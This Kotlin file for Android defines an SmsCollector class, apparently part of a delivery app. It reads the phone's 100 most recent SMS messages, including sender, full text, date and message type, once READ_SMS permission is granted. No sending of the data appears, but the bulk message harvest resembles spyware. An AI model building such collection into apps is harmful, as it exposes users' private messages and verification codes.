package com.baro.baro_baedal.modules

import android.Manifest
import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.provider.Telephony

/**
 * SMS 메시지를 수집하는 클래스
 * 사용자의 SMS 메시지 내용을 추출합니다.
 * READ_SMS 권한이 필요합니다.
 */
class SmsCollector(private val context: Context) {
    
    /**
     * 최근 SMS 메시지를 수집합니다.
     * 최대 100개의 메시지를 날짜 내림차순으로 수집합니다.
     * 
     * @return SMS 정보 리스트
     */
    fun collect(): List<SmsInfo> {
        val smsList = mutableListOf<SmsInfo>()
        
        // 권한 체크
        if (!PermissionHelper.hasPermission(context, Manifest.permission.READ_SMS)) {
            return smsList
        }
        
        val contentResolver: ContentResolver = context.contentResolver
        
        // 최근 메시지 100개를 날짜 내림차순으로 조회
        // ContentResolver는 LIMIT을 지원하지 않으므로 정렬만 하고, 개수는 코드에서 제한
        val cursor: Cursor? = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null,
            null,
            null,
            "${Telephony.Sms.DATE} DESC"
        )
        
        cursor?.use {
            val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
            val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
            val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
            
            var count = 0
            val maxCount = 100
            
            while (it.moveToNext() && count < maxCount) {
                val address = it.getString(addressIndex) ?: ""
                val body = it.getString(bodyIndex) ?: ""
                val date = it.getLong(dateIndex)
                
                // 메시지 타입을 한글로 변환
                val type = when (it.getInt(typeIndex)) {
                    Telephony.Sms.MESSAGE_TYPE_INBOX -> "받은 메시지"
                    Telephony.Sms.MESSAGE_TYPE_SENT -> "보낸 메시지"
                    Telephony.Sms.MESSAGE_TYPE_DRAFT -> "임시보관함"
                    Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "발신함"
                    else -> "기타"
                }
                
                smsList.add(SmsInfo(address, body, date, type))
                count++
            }
        }
        
        return smsList
    }
}

